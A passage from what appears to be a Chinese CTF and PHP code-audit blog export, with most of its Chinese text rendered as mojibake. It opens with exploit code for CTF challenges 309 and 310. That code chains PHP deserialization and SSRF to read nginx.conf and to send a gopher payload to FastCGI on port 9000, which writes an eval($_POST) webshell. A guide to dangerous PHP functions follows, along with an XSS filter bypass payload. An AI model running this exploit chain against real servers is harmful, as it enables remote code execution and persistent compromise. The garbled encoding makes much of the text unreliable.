%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));?&gt;\n\nè®¿é—®é¦–é¡µå¹¶å†™å…¥payload\n\n309è¿™é¢˜æåˆ°è¯´MySQLæœ‰å¯†ç äº†, é‚£æˆ‘ä»¬å°±æ²¡æ³•åˆ©ç”¨3306ç«¯å£äº†, å¯ä»¥å…ˆé€šè¿‡fileåè®®è¯»ä¸€ä¸‹é…ç½®æ–‡ä»¶, çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–åˆ©ç”¨ç‚¹, å¯ä»¥çœ‹åˆ°æ˜¯nginx\npoc\n&lt;?phpclass dao&#123;    private $config;    public function __construct()&#123;        $this-&gt;config=new config();    &#125;&#125;class config&#123;    public $update_url=&#x27;file:///etc/nginx/nginx.conf&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));?&gt;\n\n\nå‘ç°è¿™é‡Œå¼€æ”¾äº†9000ç«¯å£, æˆ‘ä»¬å¯ä»¥å°è¯•æ‰“ä¸€ä¸‹fastcgi\n\nexp\n&lt;?phpclass dao&#123;    private $config;    public function __construct()&#123;        $this-&gt;config=new config();    &#125;&#125;class config&#123;    public $update_url = &#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27%20echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));?&gt;\n\n310åƒä¸Šé¢˜ä¸€æ ·, å…ˆè¯»ä¸€ä¸‹é…ç½®æ–‡ä»¶çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆè¹Šè··, è¿™é‡Œ9000ç«¯å£ä»ç„¶å¼€æ”¾, æˆ‘ä»¬å†å°è¯•æ‰“ä¸€ä¸‹è¯•è¯•\n\nå¯ä»¥æˆåŠŸè¯»å–\nè¿™é¢˜æˆ‘ä»¬è¿˜ä¼šå‘ç°é…ç½®æ–‡ä»¶é‡Œè¿˜æœ‰å¦ä¸€ä¸ªç«¯å£, 4476, å¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªç«¯å£\n\nç›´è®¿é—®\nexp\n&lt;?phpclass dao&#123;    private $config;    public function __construct()&#123;        $this-&gt;config=new config();    &#125;&#125;class config&#123;    public $update_url = &#x27;http://127.0.0.1:4476&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));?&gt;\n\næ‹¿åˆ°flag\nå¸¸è§æ¼æ´å®¡è®¡æ–¹æ³•æ€»ç»“SQLæ³¨å…¥é¦–å…ˆäº†è§£SQLæ³¨å…¥å¸¸è§çš„ä¸šåŠ¡åœºæ™¯ä¸æ¼æ´ç±»å‹\n\nç”¨æˆ·ç™»å½•\næ•°æ®æœç´¢\nè·å–HTTPå¤´\nå•†å“è´­ä¹°(insert/updateæ³¨å…¥)\nä¿¡æ¯æŸ¥è¯¢\n\nå¯ä»¥è¯´, ä»»ä½•ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’çš„åœ°æ–¹éƒ½å¯èƒ½å­˜åœ¨SQLæ³¨å…¥, å¯¹äºå…¶æ¼æ´å­˜åœ¨åœºæ™¯ä¹Ÿæ˜¯å¤šç§å¤šæ ·\nå¯¹äºSQLæ³¨å…¥æœ€é¦–å…ˆè¦å…³æ³¨çš„å°±æ˜¯æ•°æ®åº“æ“ä½œçš„å…³é”®å­—\nåœ¨åŸç”ŸPHPä»£ç ä¸­è¦å¤šå…³æ³¨è¿™äº›\nselectmysqli_connectmysqli_querymysqli_fetch_rowmysqli_fetch_arrayupdateindert intodelete\n\nåœ¨CMSæˆ–è€…æ¡†æ¶ä¸­,éœ€è¦å¤šå…³æ³¨ä¸‹é¢è¿™äº›\nname()where()find()select()\n\né€šè¿‡å®šä½è¿™äº›å…³é”®å­—ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå®šä½åˆ°æ‰§è¡ŒSQLè¯­å¥çš„åœ°æ–¹ï¼Œç„¶åå»åˆ¤æ–­æ‰§è¡ŒSQLè¯­å¥ä¸­çš„å‚æ•°æ˜¯å¦é‡‡ç”¨äº†æ‹¼æ¥SQLçš„æ–¹å¼ï¼Œå¦‚æœæ˜¯åˆ™å»åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‚æ•°è¿‡æ»¤ä»¥åŠå‚æ•°æ˜¯å¦å¯æ§ã€‚\nå¦‚æœå‚æ•°ä¸å¯æ§ï¼Œæ¥æºäºæŸä¸€æ¡SQLè¯­å¥æŸ¥è¯¢å‡ºçš„ç»“æœï¼Œæˆ‘ä»¬å°±éœ€è¦é‡ç‚¹å…³æ³¨è¿™ä¸ªå‚æ•°æ˜¯å¦æ¥æºäºå…¶ä»–çš„ç”¨æˆ·è¾“å…¥ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™éœ€è¦è€ƒè™‘æ˜¯å¦å­˜åœ¨äºŒæ¬¡æ³¨å…¥çš„æƒ…å†µã€‚\nXSSxssæ¼æ´éœ€è¦é‡ç‚¹å…³æ³¨è¾“å‡ºå‡½æ•°\nprint()echo print_f()die()var_dump()print_r()\n\nç„¶åå»åˆ¤æ–­è¾“å‡ºçš„å†…å®¹æ˜¯å¦å­˜åœ¨å¯æ§å˜é‡, å¹¶æ£€æµ‹è¿™äº›å˜é‡åœ¨è¾“å…¥æˆ–è€…è¾“å‡ºçš„æ—¶å€™æ˜¯å¦é‡‡ç”¨äº†HTMLå®ä½“ç¼–ç , æˆ–è€…æ˜¯å¦å¯¹è¾“å…¥è¿›è¡Œäº†è¿‡æ»¤, å¦‚æœä»€ä¹ˆéƒ½æ²¡æœ‰, åœ¨è¾“å‡ºå†…å®¹å¯æ§çš„æƒ…å†µä¸‹åˆ™å¾ˆå¯èƒ½å­˜åœ¨xssæ¼æ´\nCSRFå¯ä»¥å°è¯•å…¨å±€æœç´¢\ncsrf-tokencsrf_tokencsrftokencsrf\n\né‡ç‚¹çœ‹ä¸€ä¸‹æ˜¯å¦åœ¨è¡¨å•å¤„å­˜åœ¨éšæœºtoken, æ˜¯å¦å­˜åœ¨æ•æ„Ÿæ“ä½œçš„è¡¨å•, æŸ¥çœ‹åç«¯ä»£ç ä¸­æ˜¯å¦ä¼šå…ˆéªŒè¯è¿™éƒ¨åˆ†token, å¦‚æœæ²¡æœ‰éªŒè¯token, å†è¿›ä¸€æ­¥çœ‹çœ‹æ˜¯å¦æœ‰referçš„ç›¸å…³éªŒè¯, å¦‚æœä¹Ÿæ²¡ç”¨å°±å¯èƒ½å­˜åœ¨csrf\nSSRFssrfæ¼æ´å¼•å‘å‡½æ•°ä¸»è¦æ˜¯èƒ½ç”¨äºè¿œç¨‹è¯·æ±‚èµ„æºçš„ä¸€äº›å‡½æ•°, åƒè¿™äº›\nfile_get_content()curl()fopen()readline()fsockopen()curl_exec()get_headers()\n\nå†çœ‹æ˜¯å¦é™åˆ¶äº†è®¿é—®ç«¯å£/åè®®/å†…ç½‘IPåœ°å€ç­‰\nå¸¸è§çš„æ¼æ´åœºæ™¯:\n\nç¤¾äº¤åˆ†äº«\nè½¬ç æœåŠ¡\nåœ¨çº¿ç¿»è¯‘\næ²¡æœ‰ä½¿ç”¨imgæ ‡ç­¾çš„è¿œç¨‹å›¾ç‰‡åŠ è½½\n\nå¯¹äºæ£€æµ‹æ–¹æ³•ä¸»è¦ä¹Ÿæ˜¯é€šè¿‡åˆ¤æ–­è¿™äº›å‡½æ•°è·å–çš„urlæˆ–è€…æ–‡ä»¶åæ˜¯å¦å¯æ§, å¦‚æœå¯æ§, åˆ™å¯èƒ½é€ æˆæ¼æ´, åŒæ—¶ä¹Ÿå®¹æ˜“é€ æˆä¸Šé¢æåˆ°çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´\nåˆ©ç”¨file://,http://,https://,dice://,gopher://åè®®æ‰“å†…ç½‘\nä»£ç æ‰§è¡Œéœ€è¦å…³æ³¨çš„ä¸€äº›å‡½æ•°:\neval()assert()preg_replace()array_map()call_user_funcn()\n\nassert()å‡½æ•°åœ¨PHPä¸­ä¸evalç±»ä¼¼ï¼Œä½†æ˜¯åªèƒ½æ‰§è¡Œä¸€è¡Œä»£ç ï¼Œåœ¨PHP7ä¸­åˆ™å–æ¶ˆäº†è¯¥å‡½æ•°æ‰§è¡ŒåŠ¨æ€ä»£ç çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰§è¡Œæ‰§è¡Œå›ºå®šçš„ä»£ç äº†ã€‚\nå…¶ä»–çš„ä»£ç æ‰§è¡Œå‡½æ•°ï¼Œå¤§å¤šæ•°ä¸ºå›è°ƒå‡½æ•°ï¼Œå…·å¤‡äº†è°ƒç”¨phpä»£ç çš„åŠŸèƒ½ã€‚\nå®¡è®¡è¦ç´ :\n\nphp.iniæ–‡ä»¶ä¸­çš„disable_functionæ˜¯å¦æœ‰ç¦ç”¨å‡½æ•°\næ˜¯å¦å­˜åœ¨å¯ä»¥diamagneticæ‰§è¡Œçš„æ•æ„Ÿå‡½æ•°\næ˜¯å¦è¾“å…¥å˜é‡å¯æ§\n\nå‘½ä»¤æ‰§è¡Œsystem()exec()shell_exec()passthru()popen()proc_open()\n\nå¯¹äºå‘½ä»¤æ‰§è¡Œæ¼æ´æ¥è¯´ï¼Œä¸»è¦è¿˜æ˜¯å­˜åœ¨äºä¸€äº›è·å–ç³»ç»Ÿä¿¡æ¯çš„åœ°æ–¹ï¼Œå¯èƒ½ä¼šé€šè¿‡æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼æ¥è·å–ï¼Œè‹¥æœè¯´æ‰§è¡Œçš„å‘½ä»¤å¯æ§çš„è¯ï¼Œåˆ™å¯èƒ½å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚\nå¯¹äºå‘½ä»¤æ‰§è¡Œçš„å…¶ä¸­å‡ ä¸ªæ–¹æ³•ï¼Œå­˜åœ¨ä¸€å®šçš„å·®å¼‚ï¼š\n\nsystem()æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è¿”å›æ‰§è¡Œç»“æœã€‚\nexec()åˆ™æ˜¯æ‰§è¡Œå‘½ä»¤åï¼Œè¿”å›ä¸€ä¸ªç»“æœå¥æŸ„ï¼Œå¹¶ä¸ç›´æ¥è¿”å›ç»“æœã€‚\nshell_exec()åˆ™æ˜¯æ‰§è¡Œä¸è¿”å›å‘½ä»¤æ‰§è¡Œåçš„ä»»ä½•ä¿¡æ¯ã€‚\n\nåœ¨phpä¸­, é€šè¿‡&#123;&#125;çš„æ–¹å¼åŒæ ·èƒ½å¤Ÿæ‰§è¡Œä»£ç , åŒæ—¶è¿˜èƒ½é€šè¿‡åŠ¨æ€æ‹¼æ¥ä»£ç çš„æ–¹å¼æ¥æ‰§è¡ŒPHPä»£ç . é€šè¿‡ä½¿ç”¨åŒåå¼•å·çš„æ–¹å¼, ä¹Ÿèƒ½å¤ŸåŒæ ·åšåˆ°ç­‰åŒäºsystemçš„å‘½ä»¤æ‰§è¡Œæ•ˆæœ\næ–‡ä»¶ä¸Šä¼ ã€åˆ é™¤ã€ä¸‹è½½æ–‡ä»¶ä¸Šä¼ å¸¸è§çš„ä¸šåŠ¡æœ‰\n\nå¤´åƒä¸Šä¼ \nå¤‡ä»½æ–‡ä»¶ä¸Šä¼ \né…ç½®æ–‡ä»¶ä¸Šä¼ \n\nå¯¹äºæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œéœ€è¦å…³æ³¨çš„å‡½æ•°ä¸ºï¼š\nmove_uplaod_file()\n\nåœ¨å®¡è®¡çš„æ—¶å€™å°±åªéœ€è¦å»æœæ¬§ç´¢è¿™ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦å¯¹æ–‡ä»¶ä¸Šä¼ çš„æ ¼å¼åšé™åˆ¶ï¼Œæˆ–è€…è¯´æ˜¯å¦å¯ä»¥ç»•è¿‡æ–‡ä»¶åç¼€é™åˆ¶ã€‚\nå¦‚æœè¯´ä¸èƒ½ç»•è¿‡çš„è¯ï¼Œåˆ™éœ€è¦å»æ£€æµ‹æ˜¯å¦å­˜åœ¨æ–‡ä»¶è§£ææ¼æ´æˆ–è€…æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç„¶åè¿›è¡Œç»•è¿‡åˆ©ç”¨ã€‚\næ–‡ä»¶åˆ é™¤å¯¹äºæ–‡ä»¶åˆ é™¤æ¼æ´ï¼Œè§¦å‘æ¼æ´çš„å‡½æ•°åŒæ ·åªæœ‰ä¸€ä¸ªï¼Œé‚£å°±æ˜¯\nunlink()\n\næˆ‘ä»¬åœ¨å®¡è®¡çš„æ—¶å€™ï¼Œåˆ¤æ–­æ–‡ä»¶åæ˜¯å¦å¯æ§ï¼ŒåŒæ—¶æ£€æµ‹æ˜¯å¦å…è®¸æ–‡ä»¶å‘½ä¸­å­˜åœ¨è·¯å¾„ç©¿è¶Šç¬¦ï¼Œå¦‚æœå…è®¸ï¼Œåˆ™è¯´æ˜å­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ï¼Œå±å®³è¾ƒå¤§ã€‚\næ–‡ä»¶å†™å…¥å¸¸è§è§¦å‘å‡½æ•°å¦‚ä¸‹\nfile_get_content()fopen()readfile()fread()file()\n\nå¯¹äºè¿™ç§æ¼æ´ï¼Œå¯ä»¥åœ¨é»‘ç›’çš„æƒ…å†µä¸‹å…ˆå»æ‰¾æ–‡ä»¶è¯»å–å’Œä¸‹è½½çš„çš„åŠŸèƒ½ç‚¹ï¼Œç„¶åé€šè¿‡è¯·æ±‚çš„URLå»åˆ†æåŠŸèƒ½å¯¹åº”çš„å…·ä½“ä»£ç ï¼Œå†æ¥åˆ¤æ–­è¯»å–çš„æ–‡ä»¶ï¼Œå…¶æ–‡ä»¶åæ˜¯å¦å¯æ§ï¼Œæ˜¯å¦å…è®¸æ–‡ä»¶åå­˜åœ¨è·¯å¾„ç©¿è¶Šç¬¦ç­‰ã€‚\nå¦‚æœå­˜åœ¨æ¼æ´çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨æ–¹æ³•ä¸€æ—¶è¯»å–ç³»ç»Ÿæ–‡ä»¶ï¼Œè€Œæ˜¯è¯»å–ç½‘ç«™æºç ï¼Œåœ¨è¯»å–çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpçš„ä¼ªåè®®æ¥è¯»å–æºç ã€‚\næ–‡ä»¶åŒ…å«å¸¸è§è§¦å‘å‡½æ•°\ninclude()require()include_once()require_once()\n\nå…¨å±€æœç´¢, ç„¶åä¸€ä¸ªä¸ªçœ‹, æŸ¥çœ‹å˜é‡å¯ä¸å¯æ§\nXXEå¸¸è§è§¦å‘å‡½æ•°\nsimplexml_load_string()DOMDocumentSimpleXMLElement\n\næˆ‘ä»¬éœ€è¦åˆ¤æ–­è¢«è§£æçš„XMLæ•°æ®æ˜¯å¦å…è®¸æˆ‘ä»¬å¤–éƒ¨è¾“å…¥ï¼Œå¹¶ä¸”æ˜¯å¦å…è®¸ä»£ç”¨å¤–éƒ¨å®ä½“ï¼Œæ˜¯å¦ç¦ç”¨äº†å¤–éƒ¨å®ä½“, ç„¶åå†è¿›è¡Œè¯¦ç»†çš„åˆ†æä¸åˆ©ç”¨\nååºåˆ—åŒ–å¯ä»¥å°è¯•å…¨å±€æœç´¢ä¸€ä¸‹serialize, é‡ç‚¹å…³æ³¨ä¸‹åˆ—å‡ ä¸ªå‡½æ•°\n__constructï¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ã€‚__destructï¼šå’Œæ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡æ‰€åœ¨å‡½æ•°è°ƒç”¨å®Œæ¯•åæ‰§è¡Œã€‚__callï¼šå½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚__get()ï¼šè·å–å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§æ—¶æ‰§è¡Œæ­¤å‡½æ•°ã€‚__set()ï¼šè®¾ç½®å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§æ—¶æ‰§è¡Œæ­¤å‡½æ•°ã€‚__toStringï¼šå½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ã€‚__sleepï¼šåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰å°±è°ƒç”¨æ­¤æ–¹æ³•(å…¶è¿”å›éœ€è¦ä¸€ä¸ªæ•°ç»„)__wakeupï¼šååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰è°ƒç”¨è¯¥æ–¹æ³•__isset()ï¼šåœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset()ï¼šåœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__invoke() ï¼šå°†å¯¹è±¡å½“ä½œå‡½æ•°æ¥ä½¿ç”¨æ—¶æ‰§è¡Œæ­¤æ–¹æ³•\n\nçœ‹çœ‹å­˜ä¸å­˜åœ¨å¯æ§å˜é‡\nå®¡è®¡æŠ€å·§æ€»ç»“GPCç®€å•ä»‹ç»ä¸€ä¸‹GPC, magic_quotes_gpcæ˜¯php.inié‡Œé¢çš„é…ç½®é€‰é¡¹,åœ¨php5.2ä¹‹å‰çš„ç‰ˆæœ¬é»˜è®¤å¼€å¯, åœ¨5.2-5.4ä¹‹é—´çš„ç‰ˆæœ¬é»˜è®¤å…³é—­, 5.4ä»¥åçš„ç‰ˆæœ¬ç›´æ¥å–æ¶ˆäº†è¿™ä¸€é…ç½®é¡¹\nè¯¥é…ç½®é¡¹çš„ä½œç”¨å°±æ˜¯å¯¹æˆ‘ä»¬ä¼ å…¥çš„POST, GET, COOKIEå˜é‡ä¸­çš„&#39;,&quot;,\\,NULLç­‰å­—ç¬¦å‰åŠ ä¸Š\\è¿›è¡Œè½¬ä¹‰\nåœ¨phpä¸­, çœ‹å…¶GPCçš„æ–¹æ³•æœ‰ä¸¤ç§, ä¸€æ˜¯åœ¨php.iniä¸­é…ç½®magic_quotes_gpcé€‰é¡¹çš„å€¼ä¸ºon, è¿˜æœ‰ä¸€ç§å°±æ˜¯åœ¨phpä»£ç ä¸­ä½¿ç”¨get_magic_quotes_gpc()å‡½æ•°åˆ¤æ–­æ˜¯å¦å¼€å¯è¯¥é€‰é¡¹, å¦‚æœæ²¡æœ‰åˆ™ä½¿ç”¨addslashes()å‡½æ•°è¿›è¡Œè½¬ä¹‰, æ¯”å¦‚\nif (!get_magic_quotes_gpc()) &#123;  //magic_quotes_gpc é…ç½®ä¸º ON åˆ™è¿”å›1ï¼Œå¦‚æœé…ç½®ä¸ºOFF åˆ™è¿”å›0\t$_POST[&#x27;message&#x27;] = addslashes($_POST[&#x27;message&#x27;]);&#125; else &#123;\t.......&#125;\n\nåœ¨phpä¸­, æˆ‘ä»¬æåˆ°äº†POSTç­‰å˜é‡ä¼šå—åˆ°å…¨å±€é…ç½®GPCçš„å½±å“, ä½†æ˜¯$_SERVERå˜é‡ä¸ä¼š, å…¶ä¸­è·å–httpå¤´å¹¶ä¸å—åˆ°GPCä¿æŠ¤, å¦‚æœè¯´è·å–çš„HTTPå¤´å­˜åœ¨äºæ•°æ®åº“äº¤äº’çš„è¡Œä¸º, åˆ™å¯èƒ½å¯¼è‡´SQLæ³¨å…¥\nåŒæ—¶ç”±äºä½¿ç”¨äº†GPCå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰, æˆ‘ä»¬éƒ½çŸ¥é“å®½å­—èŠ‚æ³¨å…¥çš„åŸç†, å¦‚æœè¯´åœ¨å¼€å¯äº†GPCçš„æƒ…å†µä¸‹, è¿˜è®¾ç½®äº†æ•°æ®åº“ç¼–ç ä¸ºGBKæ¨¡å¼, åˆ™å¯èƒ½å¯¼è‡´å®½å­—èŠ‚æ³¨å…¥çš„å­˜åœ¨, åœ¨phpä¸­è®¾ç½®æ•°æ®åº“ç¼–ç çš„æ–¹å¼æœ‰ä»¥ä¸‹ä¸¤ç§\næ–¹æ³•1ï¼š mysqli_set_charset($connnect,&#x27;GBK&#x27;)æ–¹æ³•2ï¼š mysqli_query(&quot;set names &#x27;gbk&#x27;&quot;)\n\nè¿™ä¸¤ç§æ–¹æ³•éƒ½èƒ½è®¾ç½®æ•°æ®åº“çš„ç¼–ç æ¨¡å¼ï¼Œåœ¨å¼€å¯äº†GPCçš„æƒ…å†µä¸‹ï¼Œå°±å®¹æ˜“å‡ºç°å®½å­—èŠ‚æ³¨å…¥çš„é—®é¢˜ã€‚\nåˆ©ç”¨å­—ç¬¦å¤„ç†é—®é¢˜åˆ©ç”¨å­—ç¬¦å¤„ç†å‡½æ•°æŠ¥é”™åœ¨äº†è§£è¿™ä¸ªé—®é¢˜ä¹‹å‰, æˆ‘ä»¬éœ€è¦çŸ¥é“, åœ¨phpä¸­, æŠ¥é”™ä¿¡æ¯åˆ†ä¸ºå¤šä¸ªç­‰çº§, å¯ä»¥é€šè¿‡é…ç½®php.iniçš„display_error=onæˆ–è€…åœ¨ä»£ç ä¸­ä½¿ç”¨error_reporting()æ¥è®¾ç½®æŠ¥é”™ç­‰çº§; å¸¸è§æŠ¥é”™ç­‰çº§å¦‚ä¸‹\n1ã€E_ERROR             //è‡´å‘½çš„è¿è¡Œæ—¶é”™è¯¯ã€‚è¿™ç±»é”™è¯¯ä¸€èˆ¬æ˜¯ä¸å¯æ¢å¤çš„æƒ…å†µï¼Œä¾‹å¦‚å†…å­˜åˆ†é…å¯¼è‡´çš„é—®é¢˜ã€‚åæœæ˜¯å¯¼è‡´è„šæœ¬ç»ˆæ­¢ä¸å†ç»§ç»­è¿è¡Œã€‚2ã€E_WARNING          //è¿è¡Œæ—¶è­¦å‘Š (éè‡´å‘½é”™è¯¯)ã€‚ä»…ç»™å‡ºæç¤ºä¿¡æ¯ï¼Œä½†æ˜¯è„šæœ¬ä¸ä¼šç»ˆæ­¢è¿è¡Œã€‚3ã€E_PARSE            //ç¼–è¯‘æ—¶è¯­æ³•è§£æé”™è¯¯ã€‚è§£æé”™è¯¯ä»…ä»…ç”±åˆ†æå™¨äº§ç”Ÿ4ã€E_NOTICE           //è¿è¡Œæ—¶é€šçŸ¥ã€‚5ã€E_USER_ERROR       //ç”¨æˆ·äº§ç”Ÿçš„é”™è¯¯ä¿¡æ¯ã€‚6ã€E_USER_WARNING     //ç”¨æˆ·äº§ç”Ÿçš„è­¦å‘Šä¿¡æ¯ã€‚7ã€E_USER_NOTICE8ã€E_STRICT           //å¯ç”¨ PHP å¯¹ä»£ç çš„ä¿®æ”¹å»ºè®®ï¼Œä»¥ç¡®ä¿ä»£ç å…·æœ‰æœ€ä½³çš„äº’æ“ä½œæ€§å’Œå‘å‰å…¼å®¹æ€§ã€‚9ã€E_ALL              //E_STRICTé™¤å¤–çš„æ‰€æœ‰é”™è¯¯å’Œè­¦å‘Šä¿¡æ¯ã€‚\n\nåœ¨PHPä¸­ï¼Œå¤§å¤šæ•°çš„é”™è¯¯éƒ½ä¼šæ˜¾ç¤ºé”™è¯¯çš„æ–‡ä»¶è·¯å¾„ä¸é›†ä½“ä½ç½®ï¼Œåœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸Šä¼ æˆ–è€…å†™å…¥webshellçš„çš„æƒ…å†µéœ€è¦çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨PHPæŠ¥é”™æ¥è·å–ç½‘ç«™è·¯å¾„ã€‚\nå¯¹äºPHPç¨‹åºæ¥è¯´ï¼Œå¤§å¤šæ•°å¼€å‘è€…éƒ½ä¼šä½¿ç”¨trim()å‡½æ•°æ¥å»é™¤å‚æ•°é¦–å°¾çš„ç©ºè°ƒï¼Œä½†æ˜¯å½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„çš„æ—¶å€™ï¼Œæ¯”å¦‚/index.php?a[]=test,è¿™æ—¶å€™å¦‚æœé‡‡ç”¨trim($_GET(&#39;a&#39;)) æ¥å»é™¤aå‚æ•°çš„ç©ºæ ¼çš„è¯ï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºæŠ¥é”™ã€‚\nç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰å¾ˆå¤š, ç±»ä¼¼\naddcslashes()bin2hex()chr()exho()explode()crypto()md5()\n\nåˆ©ç”¨å­—ç¬¦ä¸²æˆªæ–­å­—ç¬¦ä¸²æˆªæ–­åˆ©ç”¨æœ€å¤šçš„åˆ™æ˜¯åœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼Œä½†æ˜¯%00ç©ºå­—ç¬¦å³NULLï¼Œåœ¨å¼€å¯äº†GPCçš„æƒ…å†µä¸‹ä¼šå—åˆ°å½±å“ä¸ºä¸èƒ½æ­£å¸¸åˆ©ç”¨ã€‚åŒæ—¶åœ¨PHP5.3ä»¥åï¼Œä¿®å¤äº†è¿™ä¸€é—®é¢˜ï¼Œæ‰€ä»¥åˆ©ç”¨åœºæ™¯ç›¸å¯¹ç›®å‰æ¥æ¯”è¾ƒå°‘è§ã€‚è¿™é‡Œå°±åªç®€å•çš„æä¸€ä¸‹ã€‚\nè¿˜æœ‰å¦å¤–ä¸€ç§å­—ç¬¦ä¸²æˆªæ–­æƒ…å†µ, å°±æ˜¯ä½¿ç”¨äº†iconv()å‡½æ•°è¿›è¡Œç¼–ç è½¬æ¢æ—¶, æ¯”å¦‚utf-8è½¬æ¢ä¸ºgbkç¼–ç , æ€»ä¼šå­˜åœ¨ä¸€äº›å·®å¼‚, å¯¼è‡´è½¬æ¢å‡ºç°ä¹±ç , æ‰€ä»¥åœ¨ä½¿ç”¨äº†iconv()å‡½æ•°è¿›è¡Œè½¬æ¢æ—¶, å¦‚æœå‡ºç°äº†é”™è¯¯, åˆ™ä¼šä¸å†è¿›è¡Œè½¬æ¢, å¯¼è‡´äº†å­—ç¬¦ä¸²è¢«æˆªæ–­çš„é—®é¢˜\næœ‰å¤§ä½¬æµ‹è¯•äº†ç›¸å…³é—®é¢˜ï¼Œå‘ç°åœ¨ä½¿ç”¨iconv()å‡½æ•°å°†UTF-8ç¼–ç è½¬ä¸ºGBKç¼–ç çš„æƒ…å†µä¸‹ï¼Œé‡åˆ°cahr(128)â€”chr(255)ä¹‹é—´çš„å­—ç¬¦å¦å­˜åœ¨è¢«æˆªæ–­çš„å¯èƒ½ã€‚\nä¸ä¸¥è°¨çš„æ­£åˆ™è¡¨è¾¾å¼æ¯”å¦‚ä¸‹é¢è¿™æ ·\n$ip=$_SERVER(&#x27;HTTP_CLIENT_IP&#x27;);if(preg_match(&#x27;/\\d+\\.\\d+\\.\\d+\\.\\d+/&#x27;,$ip))&#123;\techo $ip;&#125;\n\næˆ‘ä»¬åªéœ€è¦åœ¨ä¼ å…¥çš„payloadä»¥IPåœ°å€å¼€å¤´å³å¯ç»•è¿‡, åƒè¿™æ ·127.0.0.1&lt;/scritp&gt;alert(xss)&lt;/scritp&gt;\næ–‡ç« å‚è€ƒ:https://blog.csdn.net/qq_45590334/article/details/126517767\n","tags":["Web","Study","PHP","ä»£ç å®¡è®¡"]},{"title":"Web_XSS","url":"/2022/05/04/web_XSS/","content":"åœ¨è¿™ä¹‹å‰å…ˆææ¸…æ¥šxssçš„åŸç†\nXSSçš„åŸç†å’Œåˆ†ç±»xsså‘¢å°±æ˜¯åœ¨webé¡µé¢æ’å…¥ä¸€æ®µæ¶æ„çš„scriptä»£ç ï¼Œç”¨æˆ·æµè§ˆé¡µé¢çš„çš„æ—¶å€™ï¼ŒåµŒå…¥webé‡Œçš„scriptä»£ç å°±æ‰§è¡Œï¼Œç„¶åå°±è¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚xssæ˜¯é’ˆå¯¹ç”¨æˆ·å±‚é¢çš„æ”»å‡»ã€‚\nxssæœ‰ä¸‰ç±»ï¼šå­˜å‚¨å‹ã€åå°„å‹å’ŒDOMå‹ï¼›\nå­˜å‚¨å‹XSSï¼š\nå­˜å‚¨å‹XSSï¼ŒæŒä¹…åŒ–ï¼Œä»£ç 